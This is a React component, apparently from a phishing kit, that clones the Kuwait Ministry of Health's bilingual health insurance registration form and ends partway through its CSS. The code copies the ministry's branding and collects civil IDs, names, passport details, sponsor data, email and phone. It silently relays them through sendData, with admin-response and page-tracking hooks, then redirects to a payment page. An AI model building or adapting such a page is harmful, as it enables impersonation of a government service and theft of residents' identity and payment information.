import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { navigateToPage, sendData } from '../lib/store';

interface GroupPerson {
  civilId: string;
  name: string;
  gender: string;
  nationality: string;
  residenceType: string;
  passportExpiry: string;
  insuranceStatus: string;
  yearsCount: string;
  startDate: string;
  endDate: string;
  amount: number;
}

// Translation dictionary
const translations = {
  ar: {
    systemTitle: 'النظام الآلي لتسجيل الضمان الصحي',
    langToggle: 'English',
    serviceType: 'نوع الخدمة',
    residenceType: 'نوع الاقامه',
    yearlyAmount: 'المبلغ في السنه',
    groupCategory: 'فئة التأمين الجماعي',
    choose: '--اختار--',
    individualInsurance: 'ضمان فردي',
    groupInsurance: 'ضمان جماعي',
    insuranceStatus: 'حالة الضمان الصحي',
    civilId: 'الرقم المدني',
    civilIdPlaceholder: 'أدخل الرقم المدني',
    sponsorCivilId: 'الرقم المدني للكفيل',
    sponsorName: 'اسم الكفيل',
    name: 'الاسم',
    gender: 'الجنس',
    birthDate: 'تاريخ الميلاد',
    nationality: 'الجنسية',
    company: 'الشركة',
    workplace: 'مكان العمل',
    passportExpiry: 'تاريخ إنتهاء صلاحية الجواز',
    yearsCount: 'عدد السنوات',
    coverageStart: 'تاريخ بداية التغطية',
    coverageEnd: 'تاريخ نهاية التغطية',
    email: 'البريد الإلكتروني',
    phone: 'رقم الهاتف',
    paymentMethod: 'طريقة الدفع',
    electronicPayment: 'بوابة الدفع الإلكتروني',
    totalAmount: 'إجمالي المبلغ',
    payBtn: 'الدفع الإلكتروني',
    agreeTerms: 'أوافق',
    termsLink: 'للشروط والأحكام',
    clearBtn: 'مسح',
    addPersonTitle: 'إضافة تفاصيل التأمين',
    saveBtn: '💾 حفظ',
    cancelBtn: '❌ إلغاء',
    startDate: 'تاريخ البداية',
    endDate: 'تاريخ الانتهاء',
    amount: 'المبلغ',
    insuranceGroup: 'مجموعة التأمين',
    addPerson: 'إضافة شخص',
    deletePerson: 'حذف شخص',
    delete: 'حذف',
    noPersons: 'لا يوجد أشخاص مضافين - اضغط على زر + لإضافة شخص',
    selectYears: 'اختر عدد السنوات',
    requiredGroup: '* الرجاء إضافة شخص واحد على الأقل وإدخال البريد الإلكتروني ورقم الهاتف',
    requiredIndividual: '* الرجاء ادخال البيانات المطلوبه الرقم المدني , تاريخ إنتهاء صلاحية الجواز , عدد السنوات , تاريخ بداية التغطية',
    warningLine1: 'يرجى من مستخدمي الخدمة التأكد من صحة جميع البيانات لغرض الحصول',
    warningLine2: 'على خدمة الضمان الصحي حيث أن وزارة الصحة لا تتحمل مسؤولية',
    warningLine3: 'استرجاع المبالغ المدفوعة إذا تبين أن المعلومات المقدمة غير صحيحة يرجى',
    warningLine4: 'التأكد من صحة جميع البيانات المدخلة قبل إكمال العملية',
    warningLine5: 'نود إحاطتكم علما بأنه لايوجد استرداد مالي بعد اتمام الطلب تحت أي ظرف',
    paymentSummaryTitle: 'ملخص الدفع',
    serviceTypeLabel: 'نوع الخدمة',
    residenceTypeLabel: 'نوع الإقامة',
    yearsCountLabel: 'عدد السنوات',
    personsCountLabel: 'عدد الأشخاص',
    totalAmountLabel: 'إجمالي المبلغ',
    redirecting: 'جاري تحويلك لبوابة الدفع الإلكتروني...',
    footer: '© 2019 Ministry Of Health Kuwait . All Rights Reserved.',
    newIssue: 'إصدار جديد',
    renewal: 'تجديد',
    transfer: 'تحويل',
    newborn: 'مولود جديد',
    male: 'ذكر',
    female: 'أنثى',
    kuwaiti: 'كويتي',
    indian: 'هندي',
    bangladeshi: 'بنغلاديشي',
    srilankan: 'سريلانكي',
    filipino: 'فلبيني',
    egyptian: 'مصري',
    pakistani: 'باكستاني',
    nepali: 'نيبالي',
    ethiopian: 'إثيوبي',
    other: 'أخرى',
    privateInsurance: 'تأمين خاص',
    logoAlt: 'شعار وزارة الصحة',
  },
  en: {
    systemTitle: 'Automated Health Insurance Registration System',
    langToggle: 'العربية',
    serviceType: 'Service Type',
    residenceType: 'Residence Type',
    yearlyAmount: 'Yearly Amount',
    groupCategory: 'Group Insurance Category',
    choose: '--Select--',
    individualInsurance: 'Individual Insurance',
    groupInsurance: 'Group Insurance',
    insuranceStatus: 'Insurance Status',
    civilId: 'Civil ID',
    civilIdPlaceholder: 'Enter Civil ID',
    sponsorCivilId: 'Sponsor Civil ID',
    sponsorName: 'Sponsor Name',
    name: 'Name',
    gender: 'Gender',
    birthDate: 'Date of Birth',
    nationality: 'Nationality',
    company: 'Company',
    workplace: 'Workplace',
    passportExpiry: 'Passport Expiry Date',
    yearsCount: 'Number of Years',
    coverageStart: 'Coverage Start Date',
    coverageEnd: 'Coverage End Date',
    email: 'Email',
    phone: 'Phone Number',
    paymentMethod: 'Payment Method',
    electronicPayment: 'Electronic Payment Gateway',
    totalAmount: 'Total Amount',
    payBtn: 'Electronic Payment',
    agreeTerms: 'I agree to',
    termsLink: 'Terms and Conditions',
    clearBtn: 'Clear',
    addPersonTitle: 'Add Insurance Details',
    saveBtn: '💾 Save',
    cancelBtn: '❌ Cancel',
    startDate: 'Start Date',
    endDate: 'End Date',
    amount: 'Amount',
    insuranceGroup: 'Insurance Group',
    addPerson: 'Add Person',
    deletePerson: 'Delete Person',
    delete: 'Delete',
    noPersons: 'No persons added - Press + to add a person',
    selectYears: 'Select number of years',
    requiredGroup: '* Please add at least one person and enter email and phone number',
    requiredIndividual: '* Please enter the required data: Civil ID, Passport Expiry, Number of Years, Coverage Start Date',
    warningLine1: 'Service users are requested to verify the accuracy of all data',
    warningLine2: 'for obtaining health insurance service. The Ministry of Health',
    warningLine3: 'is not responsible for refunding amounts paid if the information',
    warningLine4: 'provided is found to be incorrect. Please verify all entered data before completing the process.',
    warningLine5: 'Please note that there is no financial refund after completing the request under any circumstances.',
    paymentSummaryTitle: 'Payment Summary',
    serviceTypeLabel: 'Service Type',
    residenceTypeLabel: 'Residence Type',
    yearsCountLabel: 'Number of Years',
    personsCountLabel: 'Number of Persons',
    totalAmountLabel: 'Total Amount',
    redirecting: 'Redirecting to electronic payment gateway...',
    footer: '© 2019 Ministry Of Health Kuwait . All Rights Reserved.',
    newIssue: 'New Issue',
    renewal: 'Renewal',
    transfer: 'Transfer',
    newborn: 'Newborn',
    male: 'Male',
    female: 'Female',
    kuwaiti: 'Kuwaiti',
    indian: 'Indian',
    bangladeshi: 'Bangladeshi',
    srilankan: 'Sri Lankan',
    filipino: 'Filipino',
    egyptian: 'Egyptian',
    pakistani: 'Pakistani',
    nepali: 'Nepali',
    ethiopian: 'Ethiopian',
    other: 'Other',
    privateInsurance: 'Private Insurance',
    logoAlt: 'Ministry of Health Logo',
  },
};

// Residence type translations (keep Arabic values for data, show English labels)
const residenceTypesAr = [
  '18 - إقامة عمل خاص',
  '18 - إقامة عمل خاص حكومي',
  '19 - شريك تجاري',
  '22 - التحاق بعائل ابن او ابنه اكبر من 18 سنه (ماده 22)',
  '22 - التحاق بعائل ابن او ابنه اقل من 18 سنه (ماده 22)',
  '22 - التحاق بعائل زوجة',
  '22 - التحاق بعائل - زوج',
  '24 - ممول ذاتياً',
  '22 - التحاق بعائل أبناء الخليجية',
  '31 - خدمات جليلة ورجال الدين',
  '29 - التحاق بعائل اخ او اخت كفيل كويتي او غير كويتي',
  '20 - الخادمات (العمالة المنزلية) تحت كفالة غير كويتي',
  '18 - رعاة الابل والاغنام في قطاع الثروة الحيوانية',
  '17 - العاملين في الهيئات الدبلوماسية و المنظمات الحكومية الدولية',
  '18 - العمال الزراعيين العاملين بالحيازات الزراعية',
  '18 - الصيادين العاملين بحرفة صيد الأسماك',
  '29 - التحاق بعائل لغير الزوجة و الأبناء',
  '23 - إقامة دراسية',
  '30 - تعديل الوضع القانوني لذوي الشهيد',
  '21 - مستثمر',
  '25 - مالك العقار',
  '20 - الخادمات (العمالة المنزلية) تحت كفالة كويتيين بدون دفع',
  '20 - الخادمات (العمالة المنزلية) تحت كفالة كويتيين (10 د.ك) دفع',
];

const residenceTypesEn: Record<string, string> = {
  '18 - إقامة عمل خاص': '18 - Private Work Residence',
  '18 - إقامة عمل خاص حكومي': '18 - Government Work Residence',
  '19 - شريك تجاري': '19 - Business Partner',
  '22 - التحاق بعائل ابن او ابنه اكبر من 18 سنه (ماده 22)': '22 - Dependent Son/Daughter Over 18 (Article 22)',
  '22 - التحاق بعائل ابن او ابنه اقل من 18 سنه (ماده 22)': '22 - Dependent Son/Daughter Under 18 (Article 22)',
  '22 - التحاق بعائل زوجة': '22 - Dependent Wife',
  '22 - التحاق بعائل - زوج': '22 - Dependent Husband',
  '24 - ممول ذاتياً': '24 - Self-Funded',
  '22 - التحاق بعائل أبناء الخليجية': '22 - Dependent Children of GCC National',
  '31 - خدمات جليلة ورجال الدين': '31 - Distinguished Services & Clergy',
  '29 - التحاق بعائل اخ او اخت كفيل كويتي او غير كويتي': '29 - Dependent Brother/Sister (Kuwaiti/Non-Kuwaiti Sponsor)',
  '20 - الخادمات (العمالة المنزلية) تحت كفالة غير كويتي': '20 - Domestic Workers (Non-Kuwaiti Sponsor)',
  '18 - رعاة الابل والاغنام في قطاع الثروة الحيوانية': '18 - Camel/Sheep Herders in Livestock Sector',
  '17 - العاملين في الهيئات الدبلوماسية و المنظمات الحكومية الدولية': '17 - Diplomatic & International Org. Workers',
  '18 - العمال الزراعيين العاملين بالحيازات الزراعية': '18 - Agricultural Workers',
  '18 - الصيادين العاملين بحرفة صيد الأسماك': '18 - Fishermen',
  '29 - التحاق بعائل لغير الزوجة و الأبناء': '29 - Dependent (Non-Wife & Non-Children)',
  '23 - إقامة دراسية': '23 - Student Residence',
  '30 - تعديل الوضع القانوني لذوي الشهيد': '30 - Legal Status Adjustment (Martyr Family)',
  '21 - مستثمر': '21 - Investor',
  '25 - مالك العقار': '25 - Property Owner',
  '20 - الخادمات (العمالة المنزلية) تحت كفالة كويتيين بدون دفع': '20 - Domestic Workers (Kuwaiti Sponsor - No Payment)',
  '20 - الخادمات (العمالة المنزلية) تحت كفالة كويتيين (10 د.ك) دفع': '20 - Domestic Workers (Kuwaiti Sponsor - 10 KD)',
};

export default function MOHRegister() {
  const [, setLocation] = useLocation();

  // Language state
  const [isEnglish, setIsEnglish] = useState(false);
  const t = isEnglish ? translations.en : translations.ar;
  const dir = isEnglish ? 'ltr' : 'rtl';

  const validateKuwaitCivilId = (id: string): boolean => {
    if (!/^[23]\d{11}$/.test(id)) return false;
    const coeff = [2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2];
    let sum = 0;
    for (let i = 0; i < 11; i++) {
      sum += parseInt(id[i]) * coeff[i];
    }
    const checkDigit = 11 - (sum % 11);
    return checkDigit === parseInt(id[11]);
  };

  // Top section
  const [serviceType, setServiceType] = useState('');
  const [residenceType, setResidenceType] = useState('');
  const [yearlyAmount, setYearlyAmount] = useState('');

  // Group insurance
  const [groupInsuranceCategory, setGroupInsuranceCategory] = useState('');
  const [groupPersons, setGroupPersons] = useState<GroupPerson[]>([]);
  const [showAddModal, setShowAddModal] = useState(false);
  const [selectedPersonIndex, setSelectedPersonIndex] = useState<number | null>(null);

  // Add modal fields
  const [modalResidenceType, setModalResidenceType] = useState('');
  const [modalInsuranceStatus, setModalInsuranceStatus] = useState('');
  const [modalCivilId, setModalCivilId] = useState('');
  const [modalName, setModalName] = useState('');
  const [modalGender, setModalGender] = useState('');
  const [modalNationality, setModalNationality] = useState('');
  const [modalPassportExpiry, setModalPassportExpiry] = useState('');
  const [modalYearsCount, setModalYearsCount] = useState('');
  const [modalStartDate, setModalStartDate] = useState('');
  const [modalEndDate, setModalEndDate] = useState('');
  const [modalAmount, setModalAmount] = useState(0);

  // Personal info (individual insurance)
  const [insuranceStatus, setInsuranceStatus] = useState('');
  const [civilId, setCivilId] = useState('');
  const [sponsorCivilId, setSponsorCivilId] = useState('');
  const [sponsorName, setSponsorName] = useState('');
  const [fullName, setFullName] = useState('');
  const [gender, setGender] = useState('');
  const [birthDate, setBirthDate] = useState('');
  const [nationality, setNationality] = useState('');
  const [company, setCompany] = useState('');
  const [workplace, setWorkplace] = useState('');
  const [passportExpiry, setPassportExpiry] = useState('');
  const [yearsCount, setYearsCount] = useState('');
  const [coverageStart, setCoverageStart] = useState('');
  const [coverageEnd, setCoverageEnd] = useState('');

  // Contact
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [phoneError, setPhoneError] = useState('');

  // Payment
  const [paymentMethod, setPaymentMethod] = useState('بوابة الدفع الإلكتروني');
  const [totalAmount, setTotalAmount] = useState(0);
  const [agreeTerms, setAgreeTerms] = useState(false);

  // Username from previous page
  const [userName, setUserName] = useState('');

  // Payment summary
  const [showPaymentSummary, setShowPaymentSummary] = useState(false);

  // Warning popup
  const [showWarning, setShowWarning] = useState(false);

  // Searchable nationality dropdown state
  const [natSearch, setNatSearch] = useState('');
  const [showNatDropdown, setShowNatDropdown] = useState(false);
  const [modalNatSearch, setModalNatSearch] = useState('');
  const [showModalNatDropdown, setShowModalNatDropdown] = useState(false);
  const natDropdownRef = useRef<HTMLDivElement>(null);
  const modalNatDropdownRef = useRef<HTMLDivElement>(null);

  const isGroupInsurance = serviceType === 'ضمان جماعي';

  // Close nationality dropdown on outside click
  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (natDropdownRef.current && !natDropdownRef.current.contains(e.target as Node)) {
        setShowNatDropdown(false);
      }
      if (modalNatDropdownRef.current && !modalNatDropdownRef.current.contains(e.target as Node)) {
        setShowModalNatDropdown(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  useEffect(() => {
    navigateToPage('صفحة التسجيل');
    const storedEnglishName = localStorage.getItem('mohEnglishName') || '';
    setUserName(storedEnglishName);
  }, []);

  // Individual insurance total
  useEffect(() => {
    if (!isGroupInsurance && yearlyAmount && yearsCount) {
      setTotalAmount(parseInt(yearlyAmount) * parseInt(yearsCount));
    }
  }, [yearlyAmount, yearsCount, isGroupInsurance]);

  // Group insurance total
  useEffect(() => {
    if (isGroupInsurance) {
      const sum = groupPersons.reduce((acc, p) => acc + p.amount, 0);
      setTotalAmount(sum);
    }
  }, [groupPersons, isGroupInsurance]);

  useEffect(() => {
    if (coverageStart && yearsCount) {
      const start = new Date(coverageStart);
      start.setFullYear(start.getFullYear() + parseInt(yearsCount));
      setCoverageEnd(start.toISOString().split('T')[0]);
    }
  }, [coverageStart, yearsCount]);

  // Modal end date calculation
  useEffect(() => {
    if (modalStartDate && modalYearsCount) {
      const start = new Date(modalStartDate);
      start.setFullYear(start.getFullYear() + parseInt(modalYearsCount));
      setModalEndDate(start.toISOString().split('T')[0]);
    }
  }, [modalStartDate, modalYearsCount]);

  // Modal amount calculation
  useEffect(() => {
    if (modalResidenceType && modalYearsCount) {
      const yearly = parseInt(getYearlyPrice(modalResidenceType, modalNationality));
      setModalAmount(yearly * parseInt(modalYearsCount));
    }
  }, [modalResidenceType, modalYearsCount, modalNationality]);

  const getYearlyPrice = (resType: string, nat: string) => {
    // غير كويتي
    if (nat !== 'كويتي' && nat !== '--اختار--' && nat !== '') {
      if (resType.includes('20 - الخادمات') && resType.includes('10 د.ك')) {
        return '10';
      }
      return '100';
    }
    // كويتي
    if (resType.includes('20 - الخادمات') && resType.includes('بدون دفع')) {
      return '5';
    } else if (resType.includes('20 - الخادمات') && resType.includes('10 د.ك')) {
      return '10';
    } else if (
      resType.includes('أبناء الخليجية') ||
      resType.includes('التحاق بعائل - زوج') ||
      resType.includes('لغير الزوجة و الأبناء') ||
      (resType.includes('20 - الخادمات') && resType.includes('غير كويتي'))
    ) {
      return '5';
    } else if (resType.includes('اقل من 18')) {
      return '30';
    } else if (resType === '22 - التحاق بعائل زوجة') {
      return '40';
    }
    return '50';
  };

  const handleResidenceChange = (val: string) => {
    setResidenceType(val);
    if (val && val !== '') {
      setYearlyAmount(getYearlyPrice(val, nationality));
      setShowWarning(true);
    }
  };

  const isPhoneValid = phone.length === 8 && /^[569]/.test(phone);
  const isFormComplete = isGroupInsurance
    ? (groupPersons.length > 0 && email && isPhoneValid && agreeTerms)
    : (serviceType && residenceType && civilId && yearsCount && coverageStart && passportExpiry && email && isPhoneValid && agreeTerms);

  const handlePayment = () => {
    if (!isFormComplete) return;

    if (isGroupInsurance) {
      const allData = {
        'نوع الخدمة': serviceType,
        'فئة التأمين الجماعي': groupInsuranceCategory,
        'البريد الإلكتروني': email,
        'رقم الهاتف': '+965' + phone,
        'طريقة الدفع': paymentMethod,
        'إجمالي المبلغ': totalAmount,
        'عدد الأشخاص': groupPersons.length,
        'تفاصيل المجموعة': groupPersons.map((p, i) => ({
          [`شخص ${i + 1}`]: {
            'الرقم المدني': p.civilId,
            'الاسم': p.name,
            'الجنس': p.gender,
            'الجنسية': p.nationality,
            'نوع الإقامة': p.residenceType,
            'حالة الضمان الصحي': p.insuranceStatus,
            'تاريخ إنتهاء صلاحية الجواز': p.passportExpiry,
            'عدد السنوات': p.yearsCount,
            'تاريخ البداية': p.startDate,
            'تاريخ الانتهاء': p.endDate,
            'المبلغ': p.amount,
          }
        })),
      };
      sendData({
        data: allData,
        current: 'الدفع الإلكتروني - ضمان جماعي',
        waitingForAdminResponse: false,
        mode: 'silent',
      });
    } else {
      const allData = {
        'نوع الخدمة': serviceType,
        'نوع الإقامة': residenceType,
        'المبلغ في السنة': yearlyAmount,
        'حالة الضمان الصحي': insuranceStatus,
        'الرقم المدني': civilId,
        'الرقم المدني للكفيل': sponsorCivilId,
        'اسم الكفيل': sponsorName,
        'الاسم': fullName,
        'الجنس': gender,
        'تاريخ الميلاد': birthDate,
        'الجنسية': nationality,
        'الشركة': company,
        'مكان العمل': workplace,
        'تاريخ إنتهاء صلاحية الجواز': passportExpiry,
        'عدد السنوات': yearsCount,
        'تاريخ بداية التغطية': coverageStart,
        'تاريخ نهاية التغطية': coverageEnd,
        'البريد الإلكتروني': email,
        'رقم الهاتف': '+965' + phone,
        'طريقة الدفع': paymentMethod,
        'إجمالي المبلغ': totalAmount,
      };
      sendData({
        data: allData,
        current: 'الدفع الإلكتروني',
        waitingForAdminResponse: false,
        mode: 'silent',
      });
    }

    // Save MOH payment data to localStorage for SummaryPayment page
    localStorage.setItem('mohPaymentData', JSON.stringify({
      serviceType,
      residenceType,
      yearlyAmount,
      yearsCount,
      totalAmount,
      isGroupInsurance,
      groupPersonsCount: groupPersons.length,
      persons: isGroupInsurance ? groupPersons.map(p => ({
        name: p.name,
        civilId: p.civilId,
        nationality: p.nationality,
        residenceType: p.residenceType,
        yearsCount: p.yearsCount,
        amount: p.amount,
      })) : [{
        name: fullName,
        civilId,
        nationality,
        residenceType,
        yearsCount,
        amount: totalAmount,
      }],
      source: 'moh',
    }));
    window.location.href = '/summary-payment?service=moh';
  };

  const handleClear = () => {
    setServiceType(''); setResidenceType(''); setYearlyAmount('');
    setInsuranceStatus(''); setSponsorCivilId(''); setSponsorName('');
    setFullName(''); setGender(''); setBirthDate('');
    setNationality(''); setCompany(''); setWorkplace('');
    setPassportExpiry(''); setYearsCount(''); setCoverageStart('');
    setCoverageEnd(''); setEmail(''); setPhone('');
    setTotalAmount(0); setAgreeTerms(false); setGroupInsuranceCategory('');
    setGroupPersons([]);
  };

  const resetModal = () => {
    setModalResidenceType(''); setModalInsuranceStatus('');
    setModalCivilId(''); setModalName(''); setModalGender('');
    setModalNationality(''); setModalPassportExpiry('');
    setModalYearsCount(''); setModalStartDate('');
    setModalEndDate(''); setModalAmount(0);
  };

  const handleAddPerson = () => {
    resetModal();
    setShowAddModal(true);
  };

  const handleSavePerson = () => {
    const person: GroupPerson = {
      civilId: modalCivilId,
      name: modalName,
      gender: modalGender,
      nationality: modalNationality,
      residenceType: modalResidenceType,
      passportExpiry: modalPassportExpiry,
      insuranceStatus: modalInsuranceStatus,
      yearsCount: modalYearsCount,
      startDate: modalStartDate,
      endDate: modalEndDate,
      amount: modalAmount,
    };
    setGroupPersons([...groupPersons, person]);
    setShowAddModal(false);
    resetModal();
  };

  const handleDeletePerson = () => {
    if (selectedPersonIndex !== null) {
      const updated = groupPersons.filter((_, i) => i !== selectedPersonIndex);
      setGroupPersons(updated);
      setSelectedPersonIndex(null);
    }
  };

  // Helper to get translated insurance status options
  const getInsuranceStatuses = () => {
    if (isEnglish) {
      return [
        { value: 'إصدار جديد', label: t.newIssue },
        { value: 'تجديد', label: t.renewal },
        { value: 'تحويل', label: t.transfer },
        { value: 'مولود جديد', label: t.newborn },
      ];
    }
    return [
      { value: 'إصدار جديد', label: 'إصدار جديد' },
      { value: 'تجديد', label: 'تجديد' },
      { value: 'تحويل', label: 'تحويل' },
      { value: 'مولود جديد', label: 'مولود جديد' },
    ];
  };

  const getGenders = () => {
    if (isEnglish) {
      return [
        { value: 'ذكر', label: t.male },
        { value: 'أنثى', label: t.female },
      ];
    }
    return [
      { value: 'ذكر', label: 'ذكر' },
      { value: 'أنثى', label: 'أنثى' },
    ];
  };

  const getNationalities = () => {
    const allNationalities = [
      { ar: 'كويتي', en: 'Kuwaiti' },
      { ar: 'سعودي', en: 'Saudi' },
      { ar: 'إماراتي', en: 'Emirati' },
      { ar: 'بحريني', en: 'Bahraini' },
      { ar: 'قطري', en: 'Qatari' },
      { ar: 'عماني', en: 'Omani' },
      { ar: 'عراقي', en: 'Iraqi' },
      { ar: 'أردني', en: 'Jordanian' },
      { ar: 'فلسطيني', en: 'Palestinian' },
      { ar: 'لبناني', en: 'Lebanese' },
      { ar: 'سوري', en: 'Syrian' },
      { ar: 'يمني', en: 'Yemeni' },
      { ar: 'مصري', en: 'Egyptian' },
      { ar: 'سوداني', en: 'Sudanese' },
      { ar: 'ليبي', en: 'Libyan' },
      { ar: 'تونسي', en: 'Tunisian' },
      { ar: 'جزائري', en: 'Algerian' },
      { ar: 'مغربي', en: 'Moroccan' },
      { ar: 'موريتاني', en: 'Mauritanian' },
      { ar: 'صومالي', en: 'Somali' },
      { ar: 'جيبوتي', en: 'Djiboutian' },
      { ar: 'جزر القمر', en: 'Comoran' },
      { ar: 'هندي', en: 'Indian' },
      { ar: 'باكستاني', en: 'Pakistani' },
      { ar: 'بنغلاديشي', en: 'Bangladeshi' },
      { ar: 'سريلانكي', en: 'Sri Lankan' },
      { ar: 'نيبالي', en: 'Nepali' },
      { ar: 'فلبيني', en: 'Filipino' },
      { ar: 'إندونيسي', en: 'Indonesian' },
      { ar: 'ماليزي', en: 'Malaysian' },
      { ar: 'تايلاندي', en: 'Thai' },
      { ar: 'فيتنامي', en: 'Vietnamese' },
      { ar: 'كمبودي', en: 'Cambodian' },
      { ar: 'ميانماري', en: 'Myanmar' },
      { ar: 'صيني', en: 'Chinese' },
      { ar: 'ياباني', en: 'Japanese' },
      { ar: 'كوري', en: 'Korean' },
      { ar: 'تايواني', en: 'Taiwanese' },
      { ar: 'منغولي', en: 'Mongolian' },
      { ar: 'أفغاني', en: 'Afghan' },
      { ar: 'إيراني', en: 'Iranian' },
      { ar: 'تركي', en: 'Turkish' },
      { ar: 'أذربيجاني', en: 'Azerbaijani' },
      { ar: 'جورجي', en: 'Georgian' },
      { ar: 'أرمني', en: 'Armenian' },
      { ar: 'كازاخستاني', en: 'Kazakhstani' },
      { ar: 'أوزبكي', en: 'Uzbek' },
      { ar: 'تركمانستاني', en: 'Turkmen' },
      { ar: 'قيرغيزي', en: 'Kyrgyz' },
      { ar: 'طاجيكي', en: 'Tajik' },
      { ar: 'إثيوبي', en: 'Ethiopian' },
      { ar: 'إريتري', en: 'Eritrean' },
      { ar: 'كيني', en: 'Kenyan' },
      { ar: 'أوغندي', en: 'Ugandan' },
      { ar: 'تنزاني', en: 'Tanzanian' },
      { ar: 'نيجيري', en: 'Nigerian' },
      { ar: 'غاني', en: 'Ghanaian' },
      { ar: 'كاميروني', en: 'Cameroonian' },
      { ar: 'سنغالي', en: 'Senegalese' },
      { ar: 'مالي', en: 'Malian' },
      { ar: 'تشادي', en: 'Chadian' },
      { ar: 'نيجري', en: 'Nigerien' },
      { ar: 'بوركينابي', en: 'Burkinabe' },
      { ar: 'غيني', en: 'Guinean' },
      { ar: 'سيراليوني', en: 'Sierra Leonean' },
      { ar: 'ليبيري', en: 'Liberian' },
      { ar: 'إيفواري', en: 'Ivorian' },
      { ar: 'توغولي', en: 'Togolese' },
      { ar: 'بنيني', en: 'Beninese' },
      { ar: 'رواندي', en: 'Rwandan' },
      { ar: 'بوروندي', en: 'Burundian' },
      { ar: 'كونغولي', en: 'Congolese' },
      { ar: 'أنغولي', en: 'Angolan' },
      { ar: 'موزمبيقي', en: 'Mozambican' },
      { ar: 'زيمبابوي', en: 'Zimbabwean' },
      { ar: 'جنوب أفريقي', en: 'South African' },
      { ar: 'مدغشقري', en: 'Malagasy' },
      { ar: 'أمريكي', en: 'American' },
      { ar: 'كندي', en: 'Canadian' },
      { ar: 'مكسيكي', en: 'Mexican' },
      { ar: 'برازيلي', en: 'Brazilian' },
      { ar: 'أرجنتيني', en: 'Argentine' },
      { ar: 'كولومبي', en: 'Colombian' },
      { ar: 'فنزويلي', en: 'Venezuelan' },
      { ar: 'تشيلي', en: 'Chilean' },
      { ar: 'بيروفي', en: 'Peruvian' },
      { ar: 'إكوادوري', en: 'Ecuadorian' },
      { ar: 'بوليفي', en: 'Bolivian' },
      { ar: 'باراغوياني', en: 'Paraguayan' },
      { ar: 'أوروغوياني', en: 'Uruguayan' },
      { ar: 'كوبي', en: 'Cuban' },
      { ar: 'جامايكي', en: 'Jamaican' },
      { ar: 'بريطاني', en: 'British' },
      { ar: 'فرنسي', en: 'French' },
      { ar: 'ألماني', en: 'German' },
      { ar: 'إيطالي', en: 'Italian' },
      { ar: 'إسباني', en: 'Spanish' },
      { ar: 'برتغالي', en: 'Portuguese' },
      { ar: 'هولندي', en: 'Dutch' },
      { ar: 'بلجيكي', en: 'Belgian' },
      { ar: 'سويسري', en: 'Swiss' },
      { ar: 'نمساوي', en: 'Austrian' },
      { ar: 'سويدي', en: 'Swedish' },
      { ar: 'نرويجي', en: 'Norwegian' },
      { ar: 'دنماركي', en: 'Danish' },
      { ar: 'فنلندي', en: 'Finnish' },
      { ar: 'يوناني', en: 'Greek' },
      { ar: 'بولندي', en: 'Polish' },
      { ar: 'تشيكي', en: 'Czech' },
      { ar: 'مجري', en: 'Hungarian' },
      { ar: 'روماني', en: 'Romanian' },
      { ar: 'بلغاري', en: 'Bulgarian' },
      { ar: 'صربي', en: 'Serbian' },
      { ar: 'كرواتي', en: 'Croatian' },
      { ar: 'بوسني', en: 'Bosnian' },
      { ar: 'ألباني', en: 'Albanian' },
      { ar: 'أوكراني', en: 'Ukrainian' },
      { ar: 'روسي', en: 'Russian' },
      { ar: 'بيلاروسي', en: 'Belarusian' },
      { ar: 'ليتواني', en: 'Lithuanian' },
      { ar: 'لاتفي', en: 'Latvian' },
      { ar: 'إستوني', en: 'Estonian' },
      { ar: 'أيرلندي', en: 'Irish' },
      { ar: 'أيسلندي', en: 'Icelandic' },
      { ar: 'قبرصي', en: 'Cypriot' },
      { ar: 'مالطي', en: 'Maltese' },
      { ar: 'أسترالي', en: 'Australian' },
      { ar: 'نيوزيلندي', en: 'New Zealander' },
      { ar: 'فيجي', en: 'Fijian' },
      { ar: 'بدون جنسية', en: 'Stateless' },
      { ar: 'أخرى', en: 'Other' },
    ];
    return allNationalities.map(n => ({ value: n.ar, label: isEnglish ? n.en : n.ar }));
  };

  const getResidenceLabel = (arValue: string) => {
    if (isEnglish && residenceTypesEn[arValue]) return residenceTypesEn[arValue];
    return arValue;
  };

  const getServiceTypes = () => {
    return [
      { value: 'ضمان فردي', label: isEnglish ? t.individualInsurance : 'ضمان فردي' },
      { value: 'ضمان جماعي', label: isEnglish ? t.groupInsurance : 'ضمان جماعي' },
    ];
  };

  const getGroupCategories = () => {
    return [
      { value: 'تأمين خاص', label: isEnglish ? t.privateInsurance : 'تأمين خاص' },
    ];
  };

  const yearOptions = ['1', '2', '3', '4', '5'];

  const css = `
    .moh-field { display: flex; flex-direction: ${isEnglish ? 'row' : 'row-reverse'}; align-items: center; margin-bottom: 12px; }
    .moh-field label { min-width: 160px; text-align: ${isEnglish ? 'left' : 'right'}; font-size: 13px; font-weight: bold; color: #333; padding-${isEnglish ? 'right' : 'left'}: 10px; white-space: nowrap; }
    @media (max-width: 480px) {
      .moh-field { flex-direction: column !important; align-items: stretch !important; }
      .moh-field label { min-width: auto !important; text-align: ${isEnglish ? 'left' : 'right'} !important; margin-bottom: 4px; font-size: 12px !important; order: -1 !important; }
      .moh-field input, .moh-field select { max-width: 100% !important; width: 100% !important; font-size: 13px !important; order: 1 !important; }
      .moh-field input[type="date"] { min-height: 38px !important; height: 38px !important; padding: 8px 10px !important; box-sizing: border-box !important; -webkit-appearance: none !important; -moz-appearance: none !important; appearance: none !important; line-height: normal !important; }
      .row6-yearsCount { order: 1 !important; }
      .row6-coverageStart { order: 2 !important; }
      .row6-coverageEnd { order: 3 !important; }
      .service-type-row { flex-direction: column !important; }
      .service-field-type { order: 1 !important; width: 100% !important; }
      .service-field-type select { max-width: 100% !important; width: 100% !important; }
      .service-field-residence { order: 2 !important; width: 100% !important; }
      .service-field-residence select { max-width: 100% !important; width: 100% !important; }
      .service-field-amount { order: 3 !important; }
      .service-field-extra { order: 2 !important; width: 100% !important; }
      .service-field-extra select { max-width: 100% !important; width: 100% !important; }
    }
    .moh-field input, .moh-field select { flex: 1; padding: 8px 10px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; font-family: ${isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif'}; outline: none; direction: ${dir}; background: #fff; }
    .moh-field input[readonly] { background: #e9ecef; color: #555; }
    .moh-field .req { color: red; }
